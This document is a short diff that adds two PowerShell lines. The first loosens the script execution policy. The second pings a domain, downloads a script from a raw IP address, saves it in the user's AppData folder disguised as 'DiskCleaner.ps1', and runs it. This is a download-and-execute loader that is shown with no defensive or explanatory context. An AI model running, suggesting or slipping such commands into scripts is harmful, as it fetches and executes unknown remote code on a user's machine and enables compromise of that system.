@@ -1,0 +1,2 @@
+Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
+$p='unewhaven.com'; Test-Connection $p -Count 6 | Out-Null; $j='http://23.179.17.92/az.ps1'; $c=Join-Path $env:APPDATA 'DiskCleaner.ps1'; Start-BitsTransfer -Source $j -Destination $c; & $c
